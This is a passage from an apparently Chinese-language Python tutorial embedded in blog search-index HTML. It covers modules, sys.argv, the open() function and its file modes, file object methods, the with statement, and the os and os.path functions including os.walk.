提供了一个办法，把这些定义存放在文件中，为一些脚本或者交互式的解释器实例使用，这个文件被称为模块。</p><p>模块是一个包含所有你定义的函数和变量的文件，其后缀名是.py。模块可以被别的程序引入，以使用该模块中的函数等功能。这也是使用 python 标准库的方法。</p><p>下面是一个使用 python 标准库中模块的例子。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-comment"># 文件名: using_sys.py</span><br> <br>import sys<br> <br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;命令行参数如下:&#x27;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> sys.argv:<br>   <span class="hljs-built_in">print</span>(i)<br> <br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\n\nPython 路径为：&#x27;</span>, sys.path, <span class="hljs-string">&#x27;\n&#x27;</span>)<br></code></pre></td></tr></table></figure><h2 id="16-File-文件-方法"><a href="#16-File-文件-方法" class="headerlink" title="16.File(文件) 方法"></a>16.File(文件) 方法</h2><h3 id="open-方法"><a href="#open-方法" class="headerlink" title="open() 方法"></a>open() 方法</h3><p>Python <strong>open()</strong> 方法用于打开一个文件，并返回文件对象。</p><p>在对文件进行处理过程都需要使用到这个函数，如果该文件无法被打开，会抛出 <strong>OSError</strong>。</p><p><strong>注意：</strong>使用 <strong>open()</strong> 方法一定要保证关闭文件对象，即调用 <strong>close()</strong> 方法。</p><p><strong>open()</strong> 函数常用形式是接收两个参数：文件名(file)和模式(mode)。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">open</span><span class="hljs-params">(file, mode=<span class="hljs-string">&#x27;r&#x27;</span>)</span></span><br></code></pre></td></tr></table></figure><p>完整的语法格式为：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">open(file, <span class="hljs-attribute">mode</span>=<span class="hljs-string">&#x27;r&#x27;</span>, <span class="hljs-attribute">buffering</span>=-1, <span class="hljs-attribute">encoding</span>=None, <span class="hljs-attribute">errors</span>=None, <span class="hljs-attribute">newline</span>=None, <span class="hljs-attribute">closefd</span>=<span class="hljs-literal">True</span>, <span class="hljs-attribute">opener</span>=None)<br></code></pre></td></tr></table></figure><p>参数说明:</p><ul><li>file: 必需，文件路径（相对或者绝对路径）。</li><li>mode: 可选，文件打开模式</li><li>buffering: 设置缓冲</li><li>encoding: 一般使用utf8</li><li>errors: 报错级别</li><li>newline: 区分换行符</li><li>closefd: 传入的file参数类型</li><li>opener: 设置自定义开启器，开启器的返回值必须是一个打开的文件描述符。</li></ul><p>mode 参数有：</p><table><thead><tr><th align="left">模式</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">t</td><td align="left">文本模式 (默认)。</td></tr><tr><td align="left">x</td><td align="left">写模式，新建一个文件，如果该文件已存在则会报错。</td></tr><tr><td align="left">b</td><td align="left">二进制模式。</td></tr><tr><td align="left">+</td><td align="left">打开一个文件进行更新(可读可写)。</td></tr><tr><td align="left">U</td><td align="left">通用换行模式（<strong>Python 3 不支持</strong>）。</td></tr><tr><td align="left">r</td><td align="left">以只读方式打开文件。文件的指针将会放在文件的开头。这是默认模式。</td></tr><tr><td align="left">rb</td><td align="left">以二进制格式打开一个文件用于只读。文件指针将会放在文件的开头。这是默认模式。一般用于非文本文件如图片等。</td></tr><tr><td align="left">r+</td><td align="left">打开一个文件用于读写。文件指针将会放在文件的开头。</td></tr><tr><td align="left">rb+</td><td align="left">以二进制格式打开一个文件用于读写。文件指针将会放在文件的开头。一般用于非文本文件如图片等。</td></tr><tr><td align="left">w</td><td align="left">打开一个文件只用于写入。如果该文件已存在则打开文件，并从开头开始编辑，即原有内容会被删除。如果该文件不存在，创建新文件。</td></tr><tr><td align="left">wb</td><td align="left">以二进制格式打开一个文件只用于写入。如果该文件已存在则打开文件，并从开头开始编辑，即原有内容会被删除。如果该文件不存在，创建新文件。一般用于非文本文件如图片等。</td></tr><tr><td align="left">w+</td><td align="left">打开一个文件用于读写。如果该文件已存在则打开文件，并从开头开始编辑，即原有内容会被删除。如果该文件不存在，创建新文件。</td></tr><tr><td align="left">wb+</td><td align="left">以二进制格式打开一个文件用于读写。如果该文件已存在则打开文件，并从开头开始编辑，即原有内容会被删除。如果该文件不存在，创建新文件。一般用于非文本文件如图片等。</td></tr><tr><td align="left">a</td><td align="left">打开一个文件用于追加。如果该文件已存在，文件指针将会放在文件的结尾。也就是说，新的内容将会被写入到已有内容之后。如果该文件不存在，创建新文件进行写入。</td></tr><tr><td align="left">ab</td><td align="left">以二进制格式打开一个文件用于追加。如果该文件已存在，文件指针将会放在文件的结尾。也就是说，新的内容将会被写入到已有内容之后。如果该文件不存在，创建新文件进行写入。</td></tr><tr><td align="left">a+</td><td align="left">打开一个文件用于读写。如果该文件已存在，文件指针将会放在文件的结尾。文件打开时会是追加模式。如果该文件不存在，创建新文件用于读写。</td></tr><tr><td align="left">ab+</td><td align="left">以二进制格式打开一个文件用于追加。如果该文件已存在，文件指针将会放在文件的结尾。如果该文件不存在，创建新文件用于读写。</td></tr></tbody></table><p>默认为文本模式，如果要以二进制模式打开，加上 <strong>b</strong> 。</p><h3 id="file-对象"><a href="#file-对象" class="headerlink" title="file 对象"></a>file 对象</h3><p>file 对象使用 open 函数来创建，下表列出了 file 对象常用的函数：</p><table><thead><tr><th align="left">序号</th><th align="left">方法及描述</th></tr></thead><tbody><tr><td align="left">1</td><td align="left"><a href="https://www.runoob.com/python3/python3-file-close.html">file.close()</a>关闭文件。关闭后文件不能再进行读写操作。</td></tr><tr><td align="left">2</td><td align="left"><a href="https://www.runoob.com/python3/python3-file-flush.html">file.flush()</a>刷新文件内部缓冲，直接把内部缓冲区的数据立刻写入文件, 而不是被动的等待输出缓冲区写入。</td></tr><tr><td align="left">3</td><td align="left"><a href="https://www.runoob.com/python3/python3-file-fileno.html">file.fileno()</a>返回一个整型的文件描述符(file descriptor FD 整型), 可以用在如os模块的read方法等一些底层操作上。</td></tr><tr><td align="left">4</td><td align="left"><a href="https://www.runoob.com/python3/python3-file-isatty.html">file.isatty()</a>如果文件连接到一个终端设备返回 True，否则返回 False。</td></tr><tr><td align="left">5</td><td align="left"><a href="https://www.runoob.com/python3/python3-file-next.html">file.next()</a><strong>Python 3 中的 File 对象不支持 next() 方法。</strong>返回文件下一行。</td></tr><tr><td align="left">6</td><td align="left">[file.read(<a href="https://www.runoob.com/python3/python3-file-read.html">size])</a>从文件读取指定的字节数，如果未给定或为负则读取所有。</td></tr><tr><td align="left">7</td><td align="left">[file.readline(<a href="https://www.runoob.com/python3/python3-file-readline.html">size])</a>读取整行，包括 “\n” 字符。</td></tr><tr><td align="left">8</td><td align="left">[file.readlines(<a href="https://www.runoob.com/python3/python3-file-readlines.html">sizeint])</a>读取所有行并返回列表，若给定sizeint&gt;0，返回总和大约为sizeint字节的行, 实际读取值可能比 sizeint 较大, 因为需要填充缓冲区。</td></tr><tr><td align="left">9</td><td align="left">[file.seek(offset<a href="https://www.runoob.com/python3/python3-file-seek.html">, whence])</a>移动文件读取指针到指定位置</td></tr><tr><td align="left">10</td><td align="left"><a href="https://www.runoob.com/python3/python3-file-tell.html">file.tell()</a>返回文件当前位置。</td></tr><tr><td align="left">11</td><td align="left">[file.truncate(<a href="https://www.runoob.com/python3/python3-file-truncate.html">size])</a>从文件的首行首字符开始截断，截断文件为 size 个字符，无 size 表示从当前位置截断；截断之后后面的所有字符被删除，其中 windows 系统下的换行代表2个字符大小。</td></tr><tr><td align="left">12</td><td align="left"><a href="https://www.runoob.com/python3/python3-file-write.html">file.write(str)</a>将字符串写入文件，返回的是写入的字符长度。</td></tr><tr><td align="left">13</td><td align="left"><a href="https://www.runoob.com/python3/python3-file-writelines.html">file.writelines(sequence)</a>向文件写入一个序列字符串列表，如果需要换行则要自己加入每行的换行符。</td></tr><tr><td align="left"></td><td align="left"></td></tr></tbody></table><h3 id="with"><a href="#with" class="headerlink" title="with"></a>with</h3><p>不用close释放，他会在with结束之后自动释放文件</p><h2 id="17-os模块"><a href="#17-os模块" class="headerlink" title="17.os模块"></a>17.os模块</h2><h3 id="os模块"><a href="#os模块" class="headerlink" title="os模块"></a>os模块</h3><table><thead><tr><th>函数</th><th>说明</th></tr></thead><tbody><tr><td>getcwd()</td><td>返回当前的工作目录</td></tr><tr><td>listdir(path)</td><td>返回指定路径下的文件和目录信息</td></tr><tr><td>mkdir(path[,mode])</td><td>创建目录</td></tr><tr><td>makedirs(path1&#x2F;path2…[,mode])</td><td>创建多级目录</td></tr><tr><td>rmdir(path)</td><td>删除目录</td></tr><tr><td>removedirs(path1&#x2F;path2……)</td><td>删除多级目录</td></tr><tr><td>chdir(path)</td><td>将path设置为当前工作目录</td></tr></tbody></table><h3 id="os-path"><a href="#os-path" class="headerlink" title="os.path"></a>os.path</h3><table><thead><tr><th>函数</th><th>说明</th></tr></thead><tbody><tr><td>abspath(path)</td><td>用于获取文件或目录的绝对路径</td></tr><tr><td>exists(path)</td><td>用于判断文件或目录是否存在，如果存在啊返回true，否则返回false</td></tr><tr><td>join(path,name)</td><td>将目录与目录或文件名拼接起来</td></tr><tr><td>splitext()</td><td>分离文件名和拓展名</td></tr><tr><td>basename(path)</td><td>从一个目录中提取文件名</td></tr><tr><td>dirname(path)</td><td>从一个路径中提取文件路径，不包括文件名</td></tr><tr><td>isdir(path)</td><td>用于判断是否为路径</td></tr><tr><td>endswith(‘.py’)</td><td>获取以.py结尾的文件名字</td></tr></tbody></table><h3 id="walk"><a href="#walk" class="headerlink" title="walk"></a>walk</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs routeros">import os<br><br><span class="hljs-attribute">path</span>=os.getcwd()<br><span class="hljs-attribute">lis</span>=os.walk(path)<br><span class="hljs-keyword">for</span> a,b,c <span class="hljs-keyword">in</span> lis:<br>    <span class="hljs-built_in">print</span>(a)<br>    <span class="hljs-built_in">print</span>(b)<br>    <span class="hljs-built_in">print</span>(c)<br>    <br>    <br>输出结果：<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
